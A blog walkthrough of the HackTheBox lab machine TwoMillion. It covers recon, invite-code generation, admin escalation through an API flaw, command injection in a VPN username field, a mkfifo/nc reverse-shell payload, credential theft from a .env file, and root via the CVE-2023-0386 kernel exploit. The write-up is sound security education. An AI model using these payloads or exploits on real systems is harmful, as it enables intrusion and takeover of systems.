---
layout: post
title: "HTB: TwoMillion"
---
### Foothold

**Recon (nmap)**:
```
# Nmap 7.94 scan initiated Sat Jul 29 18:44:28 2023 as: nmap -sC -sV -oN twomillion-scan 10.10.11.221
Nmap scan report for 10.10.11.221
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 29 18:44:36 2023 -- 1 IP address (1 host up) scanned in 8.06 seconds
```

As we can see, there's only an SSH and HTTP server. As usual, we will look at the web service first. Adding `2million.htb` to our host file, we visit the site.

**Visiting the Website**

![TwoMillion landing page](https://cybersec.deadandbeef.com/images/twomillion-landing.png)

The website looks like the old UI of HackTheBox, which is very cool. If this was the real site, we would want to sign up to play the machines. So let's attempt to sign up (or join, in HTB's terms).

![TwoMillion signup page](https://cybersec.deadandbeef.com/images/twomillion-signup.png)

Ah, we can't sign up right away, can we? We need an invite code. This was a fun little challenge before HackTheBox got rid of it. It does add a bit of charm, needing to hack yourself into a hacking platform.

**Generating the Invite Code**

First of all, looking at the JavaScript reveals some big hints about how to generate the invite code. There is a JS file used by the website called `inviteapi.min.js` which, when deobfuscated, returns this code:
```
eval(

(function (p, a, c, k, e, d) {

e = function (c) {

return c.toString(36)

}

if (!''.replace(/^/, String)) {

while (c--) {

d[c.toString(a)] = k[c] || c.toString(a)

}

k = [

function (e) {

return d[e]

},

]

e = function () {

return '\\w+'

}

c = 1

}

while (c--) {

if (k[c]) {

p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])

}

}

return p

})(

'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',

24,

24,

'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split(

'|'

),

0,

{}

)

)
```

The strings "makeInviteCode" and "verifyInviteCode" seem like they would be JavaScript functions. Since we don't have an invite code yet, we will try the former for now. Running `makeInviteCode()` in the browser console returns:
```
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

The message is encrypted using ROT13, which we can easily decrypt using CyberChef, giving us the cleartext message of :
`In order to generate the invite code, make a POST request to /api/v1/invite/generate`

Our next step is pretty clearly broadcast to us here. Make a POST request, we will do:
```
$ curl -d "" http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SlVQSDItUDZBVTMtU09SQTQtRzZLSE8=","format":"encoded"}}
```

Our invite code is Base64 encoded here. Decoding, we get `JUPH2-P6AU3-SORA4-G6KHO`. This seems like a code, alright. Just to confirm though, we will run that `verifyInviteCode()` function from earlier, with this code as the parameter. This returns:
```
{
  "0": 200,
  "success": 1,
  "data": {
    "message": "Invite code is valid!"
  }
}
```

This is a code, alright! Let's sign up using it and check out the rest of the site!

**Gaining RCE**

![HackTheBox site while logged in](https://cybersec.deadandbeef.com/images/twomillion-loggedin.png)

Looking around the website, there isn't much to it. Many of the links are dead, with a notice signaling "database migrations." Really, this means that most of the functionality isn't there. One thing that we can do is generate a VPN key, which sends a GET to `/api/v1/user/vpn/generate`. Seeing an API endpoint like this only strikes our curiosity as hackers. Are there more endpoints? Fortunately for us, sending a GET to `/api/v1` lists all the endpoints available to us. How nice!

![HackTheBox API endpoints](https://cybersec.deadandbeef.com/images/twomillion-api.png)

Since we aren't an admin, the `/api/v1/user/auth` endpoint would be a good place to start. Grabbing our cookie and sending a GET request, we receive the following response:
```
{"loggedin":true,"username":"thehated","is_admin":0}
```

Well, that's interesting. It tells us if we're admin or not in addition to telling us if we are logged in. I wonder if we can change that. Well, the `/api/v1/admin/settings/update` endpoint may allow us to do just that. Submitting an empty PUT request to the endpoint, we receive this response:
```
{"status":"danger","message":"Invalid content type."}
```

Since this is an API that uses the JSON format, we should format our request as such. Using the following `curl` command with an additional content type header and empty JSON body,
```
curl -X PUT -H 'Content-Type: application/json' -d "{}" -H 'Cookie: PHPSESSID=pkljqub49ubhsbbonrg8seskqn' http://2million.htb/api/v1/admin/settings/update
```

we receive a message requesting additional parameters:
```
{"status":"danger","message":"Missing parameter: email"}
```

Adding the user email to our JSON body (`"email":"<your email here>"`), we receive a request to add our parameter of interest:
```
{"status":"danger","message":"Missing parameter: is_admin"}
```

Sweet! It seems like we can change our admin status. Adding the parameter `"is_admin":1` to our JSON body returns the following body:
```
{"id":28,"username":"thehated","is_admin":1}
```

It seems like our request was successful! We should now be able to access admin-only features! Our next endpoint of interest is `/api/v1/admin/vpn/generate`, as we can submit a POST request (meaning user input). Doing this with an empty JSON body gives us a response indicating the need for a username:
```
{"status":"danger","message":"Missing parameter: username"}
```

Adding the `"username":"<your username>"` to the JSON body gives us this rather large response from OpenVPN:
```
client                                                                                                                                      
dev tun                                                                                                                                     
proto udp                                                                                                                                   
remote edge-eu-free-1.2million.htb 1337                                                                                                     
resolv-retry infinite                                                                                                                       
nobind                                                                                                                                      
persist-key                                                                                                                                 
persist-tun                                                                                                                                 
remote-cert-tls server                                                                                                                      
comp-lzo                                                                                                                                    
verb 3                                                                                                                                      
data-ciphers-fallback AES-128-CBC                                                                                                           
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM                                                      
tls-cipher "DEFAULT:@SECLEVEL=0"                                                                                                            
auth SHA256                                                                                                                                 
key-direction 1                                                                                                                             
<ca>                                                                                                                                        
-----BEGIN CERTIFICATE-----                                                                                                                 
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL                                                                            
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv                                                                            
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
MIICCgKCAgEAubFCgYwD7v+eog2KetlST8UGSjt45tKzn9HmQRJeuPYwuuGvDwKS
JknVtkjFRz8RyXcXZrT4TBGOj5MXefnrFyamLU3hJJySY/zHk5LASoP0Q0cWUX5F
GFjD/RnehHXTcRMESu0M8N5R6GXWFMSl/OiaNAvuyjezO34nABXQYsqDZNC/Kx10
XJ4SQREtYcorAxVvC039vOBNBSzAquQopBaCy9X/eH9QUcfPqE8wyjvOvyrRH0Mi
<output snipped>
```

If anything, this seems like output not from the web application, but from a command. An `openvpn` command, I might add. Let's do a little experiment. Let's tack on `;sleep 5` to the end of our username and see what happens:
```
$ time curl -vvv -H 'Content-Type: application/json' -d '{"username":"thehated;sleep 5"}' -H 'Cookie: PHPSESSID=pkljqub49ubhsbbonrg8seskqn' http://2million.htb/api/v1/admin/vpn/generate
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/7.88.1
> Accept: */*
> Content-Type: application/json
> Cookie: PHPSESSID=pkljqub49ubhsbbonrg8seskqn
> Content-Length: 31
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 30 Jul 2023 04:35:29 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact

real    5.39s
user    0.01s
sys     0.01s
cpu     0%
```

It does indeed seem like the sleep command worked! Going for the classic mkfifo shell using a payload like `thehated;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.131 9001 >/tmp/f` and setting up a reverse shell using `nc -lnvp 9001`, we do indeed get that shell, and yay for us!
```
$ nc -lnvp 9001                          
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.10.11.221] 42286
sh: 0: can't access tty; job control turned off
$
```

### Lateral Movement

The first thing to do is to check out what other users are on the box. The passwd file looks like this:
```
root:x:0:0:root:/root:/bin/bash                                                                                                     [5/1945]
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                             
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                        
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                        
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                          
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                             
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

There is a user named admin on the box, which we might want to get onto. We are currently in the web application's directory, so let's see if we can easily get some credentials here. There is a SQL database, after all (and a user does need to log in with a username and password).

```
$ grep -Ri "admin" .                                                                                                                        
./.env:DB_USERNAME=admin                                                                                                                    
./index.php:$router->new('GET', '/api/v1/admin/auth', 'AdminController@is_admin');                                                          
./index.php:$router->new('POST', '/api/v1/admin/vpn/generate', 'VPNController@admin_vpn');                                                  
./index.php:$router->new('PUT', '/api/v1/admin/settings/update', 'AdminController@update_settings');                                        
./views/home.php:                            <span class=""><i class="fa fa-users"></i>&nbsp;<a href="#">Admins</a> <span class="text-succes
s pull-right"><i class="fa fa-crosshairs"></i> 5</span> <span class="text-info pull-right"><i class="fa fa-user"></i> 5&nbsp;</span> </span>
./views/changelog.php:                <span class="text-info">[~]</span> <span class="c-white">Change: Administration Delegation</span><br> 
./views/changelog.php:                Administrative tasks have been delegated to a number of users for more streamlined support and availab
ility called Moderators. Moderators are identified by the <span class="text-danger">[+M]</span> flag.                                       
./views/changelog.php:                Each member is allowed to change his username 3 times. After that, the functionality is disabled permanently. If the member requires further changes he should contact an admin.
./views/access.php:                    <p><span class="text-warning">Attention:</span> IPv6 support is required for the vpn to work. Also, i
n some OSes, the command prompt must be run as Administrator/root otherwise the connection will complete but it will fail to install the required routes to communicate with the machines.</p>
./controllers/AuthController.php:            $_SESSION["is_admin"] = $user['is_admin'];
./controllers/AuthController.php:        if (isset($_SESSION['loggedin']) && isset($_SESSION['username']) && isset($_SESSION['is_admin'])) {
./controllers/AuthController.php:            return json_encode(['loggedin' =>  $_SESSION['loggedin'] ,'username' => $_SESSION['username'],'
is_admin' => $_SESSION['is_admin']]);
./controllers/VPNController.php:    public function admin_vpn($router) {
./controllers/VPNController.php:        if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== 1) {
./controllers/AdminController.php:class AdminController
./controllers/AdminController.php:    public function is_admin($router)
./controllers/AdminController.php:        $stmt = $db->query('SELECT is_admin FROM users WHERE username = ?', ['s' => [$_SESSION['username']
]]);
./controllers/AdminController.php:        if ($user['is_admin'] == 1) {
./controllers/AdminController.php:        $is_admin = $this->is_admin($router);
./controllers/AdminController.php:        if (!$is_admin) {
./controllers/AdminController.php:        if (!isset($json->is_admin)) {
./controllers/AdminController.php:                'message' => 'Missing parameter: is_admin'
./controllers/AdminController.php:        $is_admin = $json->is_admin;
```

Bit inelegant, but we now know that there is a `.env` file, likely with some juicy credentials. Its contents are as follows:
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Bingo! There is a password for the admin user right here, and it works with sudo!

### Privilege Escalation

Using SSH to log in as admin, we see that this user has mail. Checking out the mail indicates a potential vulnerability in the kernel installed on the system:
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

So we know what we need to look for. A CVE in OverlayFS or FUSE. Searching this in Google returns results for CVE-2023-0386, and a proof of concept is available [here](https://github.com/xkaneiki/CVE-2023-0386). Downloading the zip file onto the target system and unzipping it, we can now run the exploit. First we start by using the `make all` command to compile the exploit. A few warnings show up, but they do not stop us from compiling. We can then run the exploit:
```
./fuse ./ovlcap/lower ./gc
```

Logging into another SSH session, we run the final exploit binary:
```
./exp
```

After running the binary, we get a shell as root!
```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jul 30 16:29 .
drwxrwxr-x 6 root   root     4096 Jul 30 16:29 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386-main#
```

### Optional Thank You Note

There is a file in the `/root` directory called `thank_you.json` with the following content:
```
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

The contents of the `data` key are URL encoded. Decoding it using a tool like CyberChef gives us the following output:
```
{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}
```

The data contained in the `data` key here is hex encoded this time. and decoding this gives the following output:
```
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
```

The data here is Base64 encoded, XOR encrypted with the key `HackTheBox`. Ignoring the misspelling of `encrpytion_key` present in the JSON body, we will decode and decrypt the data. Doing this gives us a nice thank-you note from the HackTheBox staff. How sweet!
```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```